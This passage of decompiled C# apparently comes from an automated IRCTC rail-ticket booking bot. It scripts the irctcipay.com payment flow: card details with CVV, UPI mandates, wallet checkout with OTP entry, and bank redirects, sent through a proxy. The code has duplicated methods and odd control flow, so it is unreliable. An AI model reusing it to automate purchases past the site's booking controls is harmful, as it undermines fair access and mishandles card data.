                    updateTStatus_1.BeginInvoke(1, "Init. " + text7 + "(2/2)", tCntrlName_, null, null);
                }
                postdata = class3_0.Method_SerialInp(response, ref url, false);
                string text12 = postdata.Substring(postdata.IndexOf("customToken") + 12);
                CookieContainer cookieContainer_;
                string text17;
                uint num;
                switch (text7)
                {
                    default:
                        postdata = "paymentType=&mopType=MC&issuerBankName=&issuerCountry=&cardHolderType=&paymentsRegion=&cardNumber=&expiryYear=&expiryMonth=&cvvNumber=&cardName=&cardsaveflag1=on&amount=" + text11 + "&customToken=" + text12 + "&cardsaveflag=false";
                        goto IL_0a49;
                    case "DC":
                        {
                            url = "https://www.irctcipay.com/pgui/jsp/binResolver";
                            string text14 = text2.Substring(0, 9);
                            postdata = "token=" + text12 + "&bin=" + text14;
                            if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                            {
                                clsMain.Lock("Getting payment out error= " + response);
                                return false;
                            }
                            string text15 = method_103(response, "mopType", ":", ",").Replace("\"", "");
                            string text16 = method_103(response, "paymentType", ":", ",").Replace("\"", "");
                            if (text7 == "DC")
                            {
                                string str2 = text2.Substring(0, 4) + " " + text2.Substring(4, 4) + " " + text2.Substring(8, 4) + " " + text2.Substring(12, 4);
                                postdata = "paymentType=" + text16 + "&mopType=" + text15 + "&issuerBankName=&issuerCountry=&cardHolderType=&paymentsRegion=&cardNumber=" + HttpUtility.UrlEncode(str2) + "&expiryYear=" + text4 + "&expiryMonth=" + text3 + "&cvvNumber=" + text5 + "&cardName=" + HttpUtility.UrlEncode(str) + "&amount=" + text11 + "&customToken=" + text12 + "&cardsaveflag=false";
                            }
                            else if (text7 == "CC")
                            {
                                string str3 = text2.Substring(0, 4) + " " + text2.Substring(4, 4) + " " + text2.Substring(8, 4) + " " + text2.Substring(12, 4);
                                postdata = "paymentType=" + text16 + "&mopType=" + text15 + "&issuerBankName=&issuerCountry=&cardHolderType=&paymentsRegion=&cardNumber=" + HttpUtility.UrlEncode(str3) + "&expiryYear=" + text4 + "&expiryMonth=" + text3 + "&cvvNumber=" + text5 + "&cardName=" + HttpUtility.UrlEncode(str) + "&cardsaveflag1=on&amount=" + text11 + "&customToken=" + text12 + "&cardsaveflag=false";
                            }
                            goto IL_0a49;
                        }
                    case "Wallet":
                        postdata = "paymentType=PPI&mopType=MMWL&amount=%E2%82%B9+" + text11;
                        postdata = "paymentType=PPI&mopType=MMWL&amount=%E2%82%B9+" + text11 + "&browserName=Chrome&browserVersion=87";
                        goto IL_0a49;
                    case "OTOPAY":
                        {
                            ThreadPool.QueueUserWorkItem(method_18, class3_0.BANKDETAILS + "||True||5||0000000000");
                           randomvalueb = DateTime.Now.Ticks.ToString("x");
                            url = "https://www.irctcipay.com/pgui/jsp/otmPay";
                            //postdata = "token=" + text12 + "&vpa=" + text2 + "&upiCustName=dummy&paymentType=UP&mopType=UP&amount=₹ " + text11 + "&currencyCode=356&browserName=Chrome&browserVersion=109";
                            postdata = "\r\n------WebKitFormBoundary"+ randomvalueb + "\r\nContent-Disposition: form-data; name=\"token\"\r\n\r\n"+ text12 + "\r\n------WebKitFormBoundary"+ randomvalueb + "\r\nContent-Disposition: form-data; name=\"vpa\"\r\n\r\n"+text2+"\r\n------WebKitFormBoundary"+ randomvalueb + "\r\nContent-Disposition: form-data; name=\"upiCustName\"\r\n\r\ndummy\r\n------WebKitFormBoundary"+ randomvalueb + "\r\nContent-Disposition: form-data; name=\"paymentType\"\r\n\r\nAD\r\n------WebKitFormBoundary"+ randomvalueb + "\r\nContent-Disposition: form-data; name=\"mopType\"\r\n\r\nUP\r\n------WebKitFormBoundary"+ randomvalueb + "\r\nContent-Disposition: form-data; name=\"amount\"\r\n\r\n₹ "+text11+"\r\n------WebKitFormBoundary"+ randomvalueb + "\r\nContent-Disposition: form-data; name=\"currencyCode\"\r\n\r\n356\r\n------WebKitFormBoundary"+ randomvalueb + "\r\nContent-Disposition: form-data; name=\"mandateType\"\r\n\r\nupiMandate\r\n------WebKitFormBoundary"+ randomvalueb + "\r\nContent-Disposition: form-data; name=\"browserName\"\r\n\r\n\r\n------WebKitFormBoundary"+ randomvalueb + "\r\nContent-Disposition: form-data; name=\"browserVersion\"\r\n\r\n\r\n------WebKitFormBoundary"+ randomvalueb + "--\r\n";

                            if (!_Request_otopay(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                            {
                                clsMain.Lock("Getting payment out error= " + response);
                                return false;
                            }
                            string text13 = method_103(response, "pgRefNum", ":", ",").Replace("\"", "");
                            string text13EE = method_103(response, "pgRefHash", ":", ",").Replace("\"", "");
                            url = "https://www.irctcipay.com/pgui/jsp/verifyOtmResponse";
                            postdata = "token=" + text12 + "&pgRefNum=" + text13  + "&pgRefHash=" + text13EE;
                            randomvalueb = DateTime.Now.Ticks.ToString("x");
                            postdata = "\r\n------WebKitFormBoundary"+ randomvalueb + "\r\nContent-Disposition: form-data; name=\"token\"\r\n\r\n"+ text12 + "\r\n------WebKitFormBoundary"+ randomvalueb + "\r\nContent-Disposition: form-data; name=\"pgRefNum\"\r\n\r\n"+ text13 + "\r\n------WebKitFormBoundary"+ randomvalueb + "\r\nContent-Disposition: form-data; name=\"pgRefHash\"\r\n\r\n"+ text13EE + "\r\n------WebKitFormBoundary"+ randomvalueb + "--\r\n";
                            DateTime dateTime = DateTime.Now.AddSeconds(20.0);
                            if (text2.Contains("@axisbank"))
                            {
                                while (true)
                                {
                                    if (DateTime.Now > dateTime)
                                    {
                                        updateTStatus_1.BeginInvoke(1, "AXIS UPI Pay Start...", tCntrlName_, null, null);
                                        frmUPI.payStart = true;
                                        break;
                                    }
                                    if (frmUPI.payStart)
                                    {
                                        Application.DoEvents();
                                        Thread.Sleep(100);
                                        continue;
                                    }
                                    updateTStatus_1.BeginInvoke(1, "AXIS UPI Pay Start...", tCntrlName_, null, null);
                                    frmUPI.payStart = true;
                                    break;
                                }
                            }
                            else
                            {
                                updateTStatus_1.BeginInvoke(1, "Accept UPI Request..", tCntrlName_, null, null);
                            }
                            
                            DateTime dateTime2 = DateTime.Now.AddSeconds(120.0);
                            do
                            {
                                //Thread.Sleep(500);
                                if (DateTime.Now > dateTime2)
                                {
                                    break;
                                }
                                _Request_otopay(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0);
                            }
                            while (string.IsNullOrEmpty(response));
                            while ((response.Contains("Captured")))
                            goto il_paysucess;
                        }
                      IL_0a49:
                        url = "https://www.irctcipay.com/pgui/jsp/pay";
                        string_52 = "Tls12";
                        if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                        {
                            clsMain.Lock("Getting payment out error= " + response);
                            return false;
                        }
                        cookieContainer_ = null;
                        text17 = text6;
                        num = Class46.smethod_0(text17);
                        if (num <= 1781929964)
                        {
                            if (num <= 873244444)
                            {
                                switch (num)
                                {
                                    case 873244444u:
                                        if (text17 == "1" && !SbiNetBanking(response, class3_0.BANKSAVEAS, class3_0.BANKDETAILS, string_89, ref response, ref string_91, updateTStatus_2, ref cookieContainer_) && cookieContainer_ != null)
                                        {
                                            ThreadPool.QueueUserWorkItem(method_110, cookieContainer_);
                                        }
                                        break;
                                    case 42484411u:
                                        if (text17 == "KOTAK_DC" && !_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                                        {
                                            clsMain.Lock("Getting payment out error= " + response);
                                            return false;
                                        }
                                        break;
                                }
                            }
                            else if (num != 1748227631)
                            {
                                if (num == 1781929964 && text17 == "113")
                                {
                                    string text18 = response;
                                    Reffral = url;
                                    string text19 = method_103(text18, "checkout_ref_id", "=", "&");
                                    url = "https://irctc-ih.mmvpay.com/api/v1/users/checkout/mobile";
                                    url = "https://beta-irctc-ih.mmvpay.com/api/v1/users/checkout/mobile";
                                    postdata = "mobile_country_code=91&mobile=" + text2 + "&checkout_ref_id=" + text19;
                                    if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                                    {
                                        clsMain.Lock("Getting payment out error= " + response);
                                        return false;
                                    }
                                    string text20 = method_103(response, "token", ":", ",").Replace("\"", "");
                                    int num2 = 0;
                                    while (true)
                                    {
                                        num2++;
                                        string value = "";
                                        if (!clsMain.dictionary_8.ContainsKey(class3_0.BANKSAVEAS))
                                        {
                                            frmOTP frmOTP = new frmOTP();
                                            frmOTP.method_1(clsMain.control_0, clsMain.rectangle_0, false, "iMudra", class3_0.BANKSAVEAS);
                                            if (frmOTP.DialogResult == DialogResult.OK)
                                            {
                                                value = frmOTP.string_0;
                                            }
                                            frmOTP.Dispose();
                                            clsMain.Lock("OTP Clear");
                                        }
                                        else
                                        {
                                            clsMain.dictionary_8.TryGetValue(class3_0.BANKSAVEAS, out value);
                                            clsMain.dictionary_8.Remove(class3_0.BANKSAVEAS);
                                        }
                                        string text21 = Class12.smethod_32(text20, value);
                                        text21 = Class12.smethod_28(value);
                                        postdata = "key=" + HttpUtility.UrlEncode(text21) + "&token=" + text20 + "&checkout_ref_id=" + text19;
                                        bool_40 = true;
                                        if (_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                                        {
                                            break;
                                        }
                                        clsMain.Lock("Getting payment out error= " + response);
                                        if (num2 >= 4)
                                        {
                                            return false;
                                        }
                                    }
                                    method_103(response, "auth_token", ":", ",").Replace("\"", "");
                                    string text22 = text18.Substring(text18.IndexOf("h_4") + 4);
                                    text22 = text22.Substring(0, text22.IndexOf("'"));
                                    url = "https://irctc-ih.mmvpay.com/api/v1/users/checkout/funds/";
                                    url = "https://beta-irctc-ih.mmvpay.com/api/v1/users/checkout/funds/";
                                    postdata = "hash=" + text22 + "&checkout_ref_id=" + text19;
                                    bool_41 = true;
                                    if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                                    {
                                        clsMain.Lock("Getting payment out error= " + response);
                                        return false;
                                    }
                                    url = "https://www.irctcipay.com/pgui/jsp/matchMoveResponse";
                                    postdata = response.Replace("\"", "").Replace("\r", "").Replace("\n", "")
                                        .Replace("{", "")
                                        .Replace("}", "")
                                        .Replace(":", "=")
                                        .Replace(",", "&");
                                    postdata = postdata.Trim();
                                    if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                                    {
                                        clsMain.Lock("Getting payment out error= " + response);
                                        return false;
                                    }
                                    break;
                                }
                            }
                            else if (text17 == "101")
                            {
                                method_178(ref response, string_94, cookieContainer_, response, ref string_91);
                            }
                            if (text17 == "103")
                            {
                                postdata = class3_0.Method_SerialInp(response, ref url, false);
                                if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                                {
                                    clsMain.Lock("Getting payment out error= " + response);
                                    return false;
                                }
                                method_174(response, string_94, cookieContainer_, string_92, ref response, ref string_91);
                                postdata = class3_0.Method_SerialInp(response, ref url, false);
                                if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                                {
                                    clsMain.Lock("Getting payment out error= " + response);
                                    return false;
                                }
                            }
                        }
                        else
                        {
                            switch (num)
                            {
                                case 2314228892u:
                                    if (text17 == "36")
                                    {
                                        HdfcPAYTM(response, class3_0.BANKDETAILS, string_89, ref response, ref string_91, updateTStatus_2);
                                    }
                                    break;
                                case 2246132678u:
                                    if (text17 == "52")
                                    {
                                        method_117(response, class3_0.BANKDETAILS, string_89, ref response, ref string_91, updateTStatus_2);
                                    }
                                    break;
                                case 2380500725u:
                                    if (text17 == "44")
                                    {
                                        method_116(response, class3_0.BANKSAVEAS, class3_0.BANKDETAILS, string_89, ref response, ref string_91, updateTStatus_2);
                                    }
                                    break;
                                case 2364708844u:
                                    if (text17 == "21")
                                    {
                                        Debit_Hdfc(response, string_94, cookieContainer_, string_93, ref response, ref string_91);
                                    }
                                    break;
                            }
                        }
                        if (updateTStatus_1 != null)
                        {
                            updateTStatus_1.BeginInvoke(1, "Init. " + text7 + "(4/6)", tCntrlName_, null, null);
                        }
                        postdata = class3_0.Method_SerialInp(response, ref url, false);
                        if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                        {
                            clsMain.Lock("Getting payment out error= " + response);
                            return false;
                        }
                        if (updateTStatus_1 != null)
                        {
                            updateTStatus_1.BeginInvoke(1, "Init. " + text7 + "(6/6)", tCntrlName_, null, null);
                        }
                        postdata = class3_0.Method_SerialInp(response, ref url, false);
                        if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                        {
                            clsMain.Lock("Getting payment out error= " + response);
                            return false;
                        }
                        break;
                }
                il_paysucess:
                if (response.Contains("BankResponse"))
                {
                    string Enc = jsonData_Serial(response, "encdata");
                    class3_0.otopaydataweb = "encdata=" + Enc;
                    class3_0.otopaydata = response;
                    //return true;
                    flag2 = true;
                }
                result = flag2;
            }
            return result;
        }

        internal bool method_160(string string_86, string string_87, string string_88, string string_89, ref string string_90, ref string string_91, UpdateTStatus updateTStatus_2)
        {
            bool flag = class3_0.LoginType == "WEB";
            bool flag2 = false;
            string_90 = "";
            string_91 = "";
            string_88 = string_88.ToUpper();
            class3_0.string_72 = "";
            clsMain.Lock("Enter ProcessCC_RAZ.  DETAILS: ");
            //string_86 = Contains("razorpay");
            response = string_86;
            string text = string_88;
            string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
            string text2 = array[0].Trim();
            string text3 = array[1];
            string text4 = "";
            string string_92 = "";
            string text5 = "";
            string str = "";
            string string_93 = "";
            string string_94 = "";
            string text6 = "";
            string text7;
            if (string_88.Contains("_DC") || string_88.Contains("_CC"))
            {
                text7 = "DC";
                text4 = array[2];
                string_92 = array[3];
                text5 = array[4];
                str = array[6];
                string_93 = array[7];
                if (text3.Length < 2)
                {
                    text3 = "0" + text3;
                }
                if ((text == "HDFC_DC") | text.Contains("HDFC_CC"))
                {
                    text6 = "21";
                }
                else if ((text == "SBI_DC") | text.Contains("SBI_CC"))
                {
                    text6 = "101";
                }
                else if (text.Contains("AIRTEL_CC"))
                {
                    text6 = "102";
                }
                else if (text.Contains("KOTAK_"))
                {
                    text6 = "KOTAK_DC";
                }
                else if (text.Contains("PAYZAP_"))
                {
                    text6 = "103";
                }
            }
            else if (string_88.Contains("IPAYUPI"))
            {
                text7 = "IPAYUPI";
                text6 = "109";
            }
            else if (string_88.Contains("IMUDRA"))
            {
                text7 = "Wallet";
                text6 = "113";
            }
            else
            {
                text7 = "NB";
                switch (text)
                {
                    case "HDFC":
                        text6 = "36";
                        break;
                    case "SBI":
                        text6 = "1";
                        break;
                    case "ICICI":
                        text6 = "44";
                        break;
                    case "UNION":
                        text6 = "28";
                        break;
                    case "IDBI":
                        text6 = "52";
                        break;
                    case "CORP":
                        text6 = "56";
                        break;
                }
            }
            if (!flag)
            {
                string text8 = response.Substring(response.IndexOf("amount") + 9);
                text8.Substring(0, text8.IndexOf("\""));
                string text9 = response.Substring(response.IndexOf("encdata") + 18);
                string text10 = text9.Substring(0, text9.IndexOf("\""));
                url = "https://www.irctcipay.com/pgui/jsp/irctcRequestAction";
                postdata = "encdata=" + text10;
            }
            else
            {

                postdata = class3_0.Method_SerialInp(response, ref url, false);
            }
            if (updateTStatus_1 != null)
            {
                updateTStatus_1.BeginInvoke(1, "Init. " + text7 + "(1/2)", tCntrlName_, null, null);
            }
            string_52 = "Tls12";
            bool result;
            if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
            {
                clsMain.Lock("Getting payment out error= " + response);
                result = false;
            }
            else
            {
                dateTime_4 = DateTime.Now.AddMilliseconds(-60.0);
                //stopwatch_0.Restart();
                string text11 = method_103(response, "<input type=\"hidden\" id=\"amount\" name=\"amount\" value", "value=", ">");
                Reffral = "https://www.irctcipay.com/pgui/jsp/surchargePaymentPage.jsp";
                if (updateTStatus_1 != null)
                {
                    updateTStatus_1.BeginInvoke(1, "Init. " + text7 + "(2/2)", tCntrlName_, null, null);
                }
                postdata = class3_0.Method_SerialInp(response, ref url, false);
                string text12 = postdata.Substring(postdata.IndexOf("customToken") + 12);
                CookieContainer cookieContainer_;
                string text17;
                uint num;
                switch (text7)
                {
                    default:
                        postdata = "paymentType=&mopType=MC&issuerBankName=&issuerCountry=&cardHolderType=&paymentsRegion=&cardNumber=&expiryYear=&expiryMonth=&cvvNumber=&cardName=&cardsaveflag1=on&amount=" + text11 + "&customToken=" + text12 + "&cardsaveflag=false";
                        goto IL_0a49;
                    case "DC":
                        {
                            url = "https://www.irctcipay.com/pgui/jsp/binResolver";
                            string text14 = text2.Substring(0, 9);
                            postdata = "token=" + text12 + "&bin=" + text14;
                            if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                            {
                                clsMain.Lock("Getting payment out error= " + response);
                                return false;
                            }
                            string text15 = method_103(response, "mopType", ":", ",").Replace("\"", "");
                            string text16 = method_103(response, "paymentType", ":", ",").Replace("\"", "");
                            if (text7 == "DC")
                            {
                                string str2 = text2.Substring(0, 4) + " " + text2.Substring(4, 4) + " " + text2.Substring(8, 4) + " " + text2.Substring(12, 4);
                                postdata = "paymentType=" + text16 + "&mopType=" + text15 + "&issuerBankName=&issuerCountry=&cardHolderType=&paymentsRegion=&cardNumber=" + HttpUtility.UrlEncode(str2) + "&expiryYear=" + text4 + "&expiryMonth=" + text3 + "&cvvNumber=" + text5 + "&cardName=" + HttpUtility.UrlEncode(str) + "&amount=" + text11 + "&customToken=" + text12 + "&cardsaveflag=false";
                            }
                            else if (text7 == "CC")
                            {
                                string str3 = text2.Substring(0, 4) + " " + text2.Substring(4, 4) + " " + text2.Substring(8, 4) + " " + text2.Substring(12, 4);
                                postdata = "paymentType=" + text16 + "&mopType=" + text15 + "&issuerBankName=&issuerCountry=&cardHolderType=&paymentsRegion=&cardNumber=" + HttpUtility.UrlEncode(str3) + "&expiryYear=" + text4 + "&expiryMonth=" + text3 + "&cvvNumber=" + text5 + "&cardName=" + HttpUtility.UrlEncode(str) + "&cardsaveflag1=on&amount=" + text11 + "&customToken=" + text12 + "&cardsaveflag=false";
                            }
                            goto IL_0a49;
                        }
                    case "Wallet":
                        postdata = "paymentType=PPI&mopType=MMWL&amount=%E2%82%B9+" + text11;
                        postdata = "paymentType=PPI&mopType=MMWL&amount=%E2%82%B9+" + text11 + "&browserName=Chrome&browserVersion=87";
                        goto IL_0a49;
                    case "IPAYUPI":
                        {
                            ThreadPool.QueueUserWorkItem(method_18, class3_0.BANKDETAILS + "||True||5||0000000000");
                            url = "https://www.irctcipay.com/pgui/jsp/upiPay";
                            postdata = "token=" + text12 + "&vpa=" + text2 + "&upiCustName=dummy&paymentType=UP&mopType=UP&amount=₹ " + text11 + "&currencyCode=356&browserName=Chrome&browserVersion=109";
                            if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                            {
                                clsMain.Lock("Getting payment out error= " + response);
                                return false;
                            }
                            string text13 = method_103(response, "pgRefNum", ":", ",").Replace("\"", "");
                            string text13EE = method_103(response, "pgRefHash", ":", ",").Replace("\"", "");
                            url = "https://www.irctcipay.com/pgui/jsp/verifyUpiResponse";
                            postdata = "token=" + text12 + "&pgRefNum=" + text13 + "&pgRefHash=" + text13EE;
                            DateTime dateTime = DateTime.Now.AddSeconds(20.0);
                            if (string_87.Contains("@axisbank"))
                            {
                                while (true)
                                {
                                    if (DateTime.Now > dateTime)
                                    {
                                        updateTStatus_1.BeginInvoke(1, "AXIS UPI Pay Start...", tCntrlName_, null, null);
                                        frmUPI.payStart = true;
                                        break;
                                    }
                                    if (frmUPI.payStart)
                                    {
                                        Application.DoEvents();
                                        Thread.Sleep(100);
                                        continue;
                                    }
                                    updateTStatus_1.BeginInvoke(1, "AXIS UPI Pay Start...", tCntrlName_, null, null);
                                    frmUPI.payStart = true;
                                    break;
                                }
                            }
                            else
                            {
                                updateTStatus_1.BeginInvoke(1, "Accept UPI Request..", tCntrlName_, null, null);
                            }
                            DateTime dateTime2 = DateTime.Now.AddSeconds(120.0);
                            do
                            {
                                //Thread.Sleep(500);
                                if (DateTime.Now > dateTime2)
                                {
                                    break;
                                }
                                _Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0);
                            }
                            while (string.IsNullOrEmpty(response));
                            while ((response.Contains("Captured")))
                                goto il_paysucess;
                        }
                    IL_0a49:
                        url = "https://www.irctcipay.com/pgui/jsp/pay";
                        string_52 = "Tls12";
                        if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                        {
                            clsMain.Lock("Getting payment out error= " + response);
                            return false;
                        }
                        cookieContainer_ = null;
                        text17 = text6;
                        num = Class46.smethod_0(text17);
                        if (num <= 1781929964)
                        {
                            if (num <= 873244444)
                            {
                                switch (num)
                                {
                                    case 873244444u:
                                        if (text17 == "1" && !SbiNetBanking(response, class3_0.BANKSAVEAS, class3_0.BANKDETAILS, string_89, ref response, ref string_91, updateTStatus_2, ref cookieContainer_) && cookieContainer_ != null)
                                        {
                                            ThreadPool.QueueUserWorkItem(method_110, cookieContainer_);
                                        }
                                        break;
                                    case 42484411u:
                                        if (text17 == "KOTAK_DC" && !_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                                        {
                                            clsMain.Lock("Getting payment out error= " + response);
                                            return false;
                                        }
                                        break;
                                }
                            }
                            else if (num != 1748227631)
                            {
                                if (num == 1781929964 && text17 == "113")
                                {
                                    string text18 = response;
                                    Reffral = url;
                                    string text19 = method_103(text18, "checkout_ref_id", "=", "&");
                                    url = "https://irctc-ih.mmvpay.com/api/v1/users/checkout/mobile";
                                    url = "https://beta-irctc-ih.mmvpay.com/api/v1/users/checkout/mobile";
                                    postdata = "mobile_country_code=91&mobile=" + text2 + "&checkout_ref_id=" + text19;
                                    if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                                    {
                                        clsMain.Lock("Getting payment out error= " + response);
                                        return false;
                                    }
                                    string text20 = method_103(response, "token", ":", ",").Replace("\"", "");
                                    int num2 = 0;
                                    while (true)
                                    {
                                        num2++;
                                        string value = "";
                                        if (!clsMain.dictionary_8.ContainsKey(class3_0.BANKSAVEAS))
                                        {
                                            frmOTP frmOTP = new frmOTP();
                                            frmOTP.method_1(clsMain.control_0, clsMain.rectangle_0, false, "iMudra", class3_0.BANKSAVEAS);
                                            if (frmOTP.DialogResult == DialogResult.OK)
                                            {
                                                value = frmOTP.string_0;
                                            }
                                            frmOTP.Dispose();
                                            clsMain.Lock("OTP Clear");
                                        }
                                        else
                                        {
                                            clsMain.dictionary_8.TryGetValue(class3_0.BANKSAVEAS, out value);
                                            clsMain.dictionary_8.Remove(class3_0.BANKSAVEAS);
                                        }
                                        string text21 = Class12.smethod_32(text20, value);
                                        text21 = Class12.smethod_28(value);
                                        postdata = "key=" + HttpUtility.UrlEncode(text21) + "&token=" + text20 + "&checkout_ref_id=" + text19;
                                        bool_40 = true;
                                        if (_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                                        {
                                            break;
                                        }
                                        clsMain.Lock("Getting payment out error= " + response);
                                        if (num2 >= 4)
                                        {
                                            return false;
                                        }
                                    }
                                    method_103(response, "auth_token", ":", ",").Replace("\"", "");
                                    string text22 = text18.Substring(text18.IndexOf("h_4") + 4);
                                    text22 = text22.Substring(0, text22.IndexOf("'"));
                                    url = "https://irctc-ih.mmvpay.com/api/v1/users/checkout/funds/";
                                    url = "https://beta-irctc-ih.mmvpay.com/api/v1/users/checkout/funds/";
                                    postdata = "hash=" + text22 + "&checkout_ref_id=" + text19;
                                    bool_41 = true;
                                    if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                                    {
                                        clsMain.Lock("Getting payment out error= " + response);
                                        return false;
                                    }
                                    url = "https://www.irctcipay.com/pgui/jsp/matchMoveResponse";
                                    postdata = response.Replace("\"", "").Replace("\r", "").Replace("\n", "")
                                        .Replace("{", "")
                                        .Replace("}", "")
                                        .Replace(":", "=")
                                        .Replace(",", "&");
                                    postdata = postdata.Trim();
                                    if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                                    {
                                        clsMain.Lock("Getting payment out error= " + response);
                                        return false;
                                    }
                                    break;
                                }
                            }
                            else if (text17 == "101")
                            {
                                method_178(ref response, string_94, cookieContainer_, response, ref string_91);
                            }
                            if (text17 == "103")
                            {
                                postdata = class3_0.Method_SerialInp(response, ref url, false);
                                if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                                {
                                    clsMain.Lock("Getting payment out error= " + response);
                                    return false;
                                }
                                method_174(response, string_94, cookieContainer_, string_92, ref response, ref string_91);
                                postdata = class3_0.Method_SerialInp(response, ref url, false);
                                if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                                {
                                    clsMain.Lock("Getting payment out error= " + response);
                                    return false;
                                }
                            }
                        }
                        else
                        {
                            switch (num)
                            {
                                case 2314228892u:
                                    if (text17 == "36")
                                    {
                                        HdfcPAYTM(response, class3_0.BANKDETAILS, string_89, ref response, ref string_91, updateTStatus_2);
                                    }
                                    break;
                                case 2246132678u:
                                    if (text17 == "52")
                                    {
                                        method_117(response, class3_0.BANKDETAILS, string_89, ref response, ref string_91, updateTStatus_2);
                                    }
                                    break;
                                case 2380500725u:
                                    if (text17 == "44")
                                    {
                                        method_116(response, class3_0.BANKSAVEAS, class3_0.BANKDETAILS, string_89, ref response, ref string_91, updateTStatus_2);
                                    }
                                    break;
                                case 2364708844u:
                                    if (text17 == "21")
                                    {
                                        Debit_Hdfc(response, string_94, cookieContainer_, string_93, ref response, ref string_91);
                                    }
                                    break;
                            }
                        }
                        if (updateTStatus_1 != null)
                        {
                            updateTStatus_1.BeginInvoke(1, "Init. " + text7 + "(4/6)", tCntrlName_, null, null);
                        }
                        postdata = class3_0.Method_SerialInp(response, ref url, false);
                        if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                        {
                            clsMain.Lock("Getting payment out error= " + response);
                            return false;
                        }
                        if (updateTStatus_1 != null)
                        {
                            updateTStatus_1.BeginInvoke(1, "Init. " + text7 + "(6/6)", tCntrlName_, null, null);
                        }
                        postdata = class3_0.Method_SerialInp(response, ref url, false);
                        if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                        {
                            clsMain.Lock("Getting payment out error= " + response);
                            return false;
                        }
                        break;
                }
            il_paysucess:
                if (response.Contains("BankResponse"))
                {
                    string Enc = jsonData_Serial(response, "encdata");
                    string_92 = "encdata=" + Enc;
                    string_90 = response;
                    //return true;
                    flag2 = true;
                }
                result = flag2;
            }
            return result;
        }

        private string method_103(string string_86, string string_87, string string_88, string string_89)
        {
            int startIndex = string_86.IndexOf(string_87);
            startIndex = string_86.IndexOf(string_88, startIndex) + string_88.Length;
            int length = string_86.IndexOf(string_89, startIndex) - startIndex;
            return string_86.Substring(startIndex, length);
        }

        public static string jsonData_Serial(string str, string what)
        {
            string result = "";
            try
            {
                int startIndex = str.IndexOf("\"" + what + "\"", StringComparison.CurrentCultureIgnoreCase);
                string text = str.Substring(startIndex);
                text = text.Substring(text.IndexOf(":\"") + 2);
                result = text.Substring(0, text.IndexOf("\""));
                return result;
            }
            catch
            {
            }
            return result;
        }

        private string method_162(string string_86)
        {
            string text = "";
            try
            {
                string[] array = string_86.Split(new string[1] { "&" }, StringSplitOptions.RemoveEmptyEntries);
                int num = Information.UBound(array);
                for (int i = 0; i <= num; i++)
                {
                    string[] array2 = Strings.Split(array[i], "=");
                    if (array2[0] == "CHECKSUMHASH")
                    {
                        string text2 = WebUtility.UrlEncode(HttpUtility.UrlDecode(array2[1])).Trim();
                        text2 = text2.Replace("%5Cn", "%0A");
                        text = text + "&" + array2[0] + "=" + text2;
                    }
                    else
                    {
                        text = text + "&" + array2[0] + "=" + WebUtility.UrlEncode(HttpUtility.UrlDecode(array2[1]));
                    }
                }
            }
            catch
            {
            }
            return text;
        }

        private string method_162_(string string_86)
        {
            string text = "";
            try
            {
                string[] array = string_86.Split(new string[1] { "&" }, StringSplitOptions.RemoveEmptyEntries);
                int num = Information.UBound(array);
                for (int i = 0; i <= num; i++)
                {
                    string[] array2 = Strings.Split(array[i], "=");
                    if (array2[0] == "CHECKSUMHASH")
                    {
